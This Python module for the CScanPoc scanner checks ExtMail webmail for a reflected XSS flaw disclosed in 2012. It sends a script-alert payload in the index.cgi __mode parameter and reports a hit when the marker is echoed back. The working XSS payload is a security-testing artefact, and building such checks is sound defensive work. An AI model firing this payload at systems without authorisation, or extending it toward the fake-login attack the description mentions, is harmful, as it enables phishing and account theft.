# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ExtMail_0003'  # 平台漏洞编号，留空
    name = 'ExtMail 反射型XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2012-11-20'  # 漏洞公布时间
    desc = '''     
        广州领立斯网络科技 ExtMail 跨站，伪造登陆框。
        /extmail/cgi/index.cgi?__mode=<script>alert(\'testvul\')</script>
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=015005'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ExtMail'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '73c36a9c-7aa8-4703-b856-30cba29bc69a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2010-015005
            hh = hackhttp.hackhttp()
            payload = '/extmail/cgi/index.cgi?__mode=<script>alert(\'testvul\')</script>'
            code, head, res, errcode, _ = hh.http(self.target + payload)

            if code == 200 and 'testvul' in res:
                #security_info('反射型 xss '+arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
